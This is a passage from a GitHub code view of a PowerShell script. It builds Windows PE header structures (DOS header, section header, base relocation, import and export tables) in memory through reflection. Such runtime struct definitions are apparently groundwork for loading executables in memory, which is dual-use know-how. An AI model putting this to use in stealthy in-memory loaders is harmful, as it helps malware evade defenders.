        </tr>
        <tr>
          <td id="L483" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="483"></td>
          <td id="LC483" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$FieldArray</span> <span class="pl-k">=</span> <span class="pl-k">@</span>([<span class="pl-k">System.Runtime.InteropServices.MarshalAsAttribute</span>].GetField(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeConst<span class="pl-pds">&#39;</span></span>))</td>
        </tr>
        <tr>
          <td id="L484" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="484"></td>
          <td id="LC484" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$AttribBuilder</span> <span class="pl-k">=</span> <span class="pl-c1">New-Object</span> System.Reflection.Emit.CustomAttributeBuilder(<span class="pl-smi">$ConstructorInfo</span><span class="pl-k">,</span> <span class="pl-smi">$ConstructorValue</span><span class="pl-k">,</span> <span class="pl-smi">$FieldArray</span><span class="pl-k">,</span> <span class="pl-k">@</span>([<span class="pl-k">Int32</span>] <span class="pl-c1">4</span>))</td>
        </tr>
        <tr>
          <td id="L485" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="485"></td>
          <td id="LC485" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$e_resField<span class="pl-smi">.SetCustomAttribute</span></span>(<span class="pl-smi">$AttribBuilder</span>)</td>
        </tr>
        <tr>
          <td id="L486" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="486"></td>
          <td id="LC486" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L487" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="487"></td>
          <td id="LC487" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_oemid<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L488" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="488"></td>
          <td id="LC488" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_oeminfo<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L489" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="489"></td>
          <td id="LC489" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L490" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="490"></td>
          <td id="LC490" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$e_res2Field</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_res2<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>[]]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public, HasFieldMarshal<span class="pl-pds">&#39;</span></span>)</td>
        </tr>
        <tr>
          <td id="L491" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="491"></td>
          <td id="LC491" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ConstructorValue</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.UnmanagedType</span>]::ByValArray</td>
        </tr>
        <tr>
          <td id="L492" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="492"></td>
          <td id="LC492" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$AttribBuilder</span> <span class="pl-k">=</span> <span class="pl-c1">New-Object</span> System.Reflection.Emit.CustomAttributeBuilder(<span class="pl-smi">$ConstructorInfo</span><span class="pl-k">,</span> <span class="pl-smi">$ConstructorValue</span><span class="pl-k">,</span> <span class="pl-smi">$FieldArray</span><span class="pl-k">,</span> <span class="pl-k">@</span>([<span class="pl-k">Int32</span>] <span class="pl-c1">10</span>))</td>
        </tr>
        <tr>
          <td id="L493" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="493"></td>
          <td id="LC493" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$e_res2Field<span class="pl-smi">.SetCustomAttribute</span></span>(<span class="pl-smi">$AttribBuilder</span>)</td>
        </tr>
        <tr>
          <td id="L494" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="494"></td>
          <td id="LC494" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L495" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="495"></td>
          <td id="LC495" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_lfanew<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">Int32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L496" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="496"></td>
          <td id="LC496" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$IMAGE_DOS_HEADER</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()	</td>
        </tr>
        <tr>
          <td id="L497" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="497"></td>
          <td id="LC497" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_DOS_HEADER <span class="pl-k">-</span>Value <span class="pl-smi">$IMAGE_DOS_HEADER</span></td>
        </tr>
        <tr>
          <td id="L498" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="498"></td>
          <td id="LC498" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L499" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="499"></td>
          <td id="LC499" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Struct IMAGE_SECTION_HEADER</span></td>
        </tr>
        <tr>
          <td id="L500" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="500"></td>
          <td id="LC500" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Attributes</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L501" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="501"></td>
          <td id="LC501" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_SECTION_HEADER<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$Attributes</span><span class="pl-k">,</span> [<span class="pl-k">System.ValueType</span>]<span class="pl-k">,</span> <span class="pl-c1">40</span>)</td>
        </tr>
        <tr>
          <td id="L502" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="502"></td>
          <td id="LC502" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L503" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="503"></td>
          <td id="LC503" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$nameField</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Name<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">Char</span>[]]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public, HasFieldMarshal<span class="pl-pds">&#39;</span></span>)</td>
        </tr>
        <tr>
          <td id="L504" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="504"></td>
          <td id="LC504" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ConstructorValue</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.UnmanagedType</span>]::ByValArray</td>
        </tr>
        <tr>
          <td id="L505" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="505"></td>
          <td id="LC505" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$AttribBuilder</span> <span class="pl-k">=</span> <span class="pl-c1">New-Object</span> System.Reflection.Emit.CustomAttributeBuilder(<span class="pl-smi">$ConstructorInfo</span><span class="pl-k">,</span> <span class="pl-smi">$ConstructorValue</span><span class="pl-k">,</span> <span class="pl-smi">$FieldArray</span><span class="pl-k">,</span> <span class="pl-k">@</span>([<span class="pl-k">Int32</span>] <span class="pl-c1">8</span>))</td>
        </tr>
        <tr>
          <td id="L506" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="506"></td>
          <td id="LC506" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$nameField<span class="pl-smi">.SetCustomAttribute</span></span>(<span class="pl-smi">$AttribBuilder</span>)</td>
        </tr>
        <tr>
          <td id="L507" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="507"></td>
          <td id="LC507" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L508" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="508"></td>
          <td id="LC508" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>VirtualSize<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L509" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="509"></td>
          <td id="LC509" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>VirtualAddress<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L510" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="510"></td>
          <td id="LC510" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfRawData<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L511" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="511"></td>
          <td id="LC511" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>PointerToRawData<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L512" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="512"></td>
          <td id="LC512" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>PointerToRelocations<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L513" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="513"></td>
          <td id="LC513" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>PointerToLinenumbers<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L514" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="514"></td>
          <td id="LC514" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>NumberOfRelocations<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L515" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="515"></td>
          <td id="LC515" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>NumberOfLinenumbers<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L516" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="516"></td>
          <td id="LC516" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Characteristics<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L517" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="517"></td>
          <td id="LC517" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$IMAGE_SECTION_HEADER</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L518" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="518"></td>
          <td id="LC518" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_SECTION_HEADER <span class="pl-k">-</span>Value <span class="pl-smi">$IMAGE_SECTION_HEADER</span></td>
        </tr>
        <tr>
          <td id="L519" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="519"></td>
          <td id="LC519" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L520" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="520"></td>
          <td id="LC520" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Struct IMAGE_BASE_RELOCATION</span></td>
        </tr>
        <tr>
          <td id="L521" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="521"></td>
          <td id="LC521" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Attributes</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L522" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="522"></td>
          <td id="LC522" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_BASE_RELOCATION<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$Attributes</span><span class="pl-k">,</span> [<span class="pl-k">System.ValueType</span>]<span class="pl-k">,</span> <span class="pl-c1">8</span>)</td>
        </tr>
        <tr>
          <td id="L523" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="523"></td>
          <td id="LC523" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>VirtualAddress<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L524" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="524"></td>
          <td id="LC524" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfBlock<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L525" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="525"></td>
          <td id="LC525" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$IMAGE_BASE_RELOCATION</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L526" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="526"></td>
          <td id="LC526" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_BASE_RELOCATION <span class="pl-k">-</span>Value <span class="pl-smi">$IMAGE_BASE_RELOCATION</span></td>
        </tr>
        <tr>
          <td id="L527" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="527"></td>
          <td id="LC527" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L528" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="528"></td>
          <td id="LC528" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Struct IMAGE_IMPORT_DESCRIPTOR</span></td>
        </tr>
        <tr>
          <td id="L529" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="529"></td>
          <td id="LC529" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Attributes</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L530" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="530"></td>
          <td id="LC530" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_IMPORT_DESCRIPTOR<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$Attributes</span><span class="pl-k">,</span> [<span class="pl-k">System.ValueType</span>]<span class="pl-k">,</span> <span class="pl-c1">20</span>)</td>
        </tr>
        <tr>
          <td id="L531" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="531"></td>
          <td id="LC531" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Characteristics<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L532" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="532"></td>
          <td id="LC532" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>TimeDateStamp<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L533" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="533"></td>
          <td id="LC533" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>ForwarderChain<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L534" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="534"></td>
          <td id="LC534" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Name<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L535" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="535"></td>
          <td id="LC535" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>FirstThunk<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L536" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="536"></td>
          <td id="LC536" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$IMAGE_IMPORT_DESCRIPTOR</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L537" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="537"></td>
          <td id="LC537" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_IMPORT_DESCRIPTOR <span class="pl-k">-</span>Value <span class="pl-smi">$IMAGE_IMPORT_DESCRIPTOR</span></td>
        </tr>
        <tr>
          <td id="L538" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="538"></td>
          <td id="LC538" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L539" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="539"></td>
          <td id="LC539" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Struct IMAGE_EXPORT_DIRECTORY</span></td>
        </tr>
        <tr>
          <td id="L540" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="540"></td>
          <td id="LC540" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Attributes</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L541" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="541"></td>
          <td id="LC541" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_EXPORT_DIRECTORY<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$Attributes</span><span class="pl-k">,</span> [<span class="pl-k">System.ValueType</span>]<span class="pl-k">,</span> <span class="pl-c1">40</span>)</td>
        </tr>
        <tr>
          <td id="L542" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="542"></td>
          <td id="LC542" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Characteristics<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L543" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="543"></td>
          <td id="LC543" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>TimeDateStamp<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L544" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="544"></td>
          <td id="LC544" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MajorVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L545" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="545"></td>
          <td id="LC545" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MinorVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L546" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="546"></td>
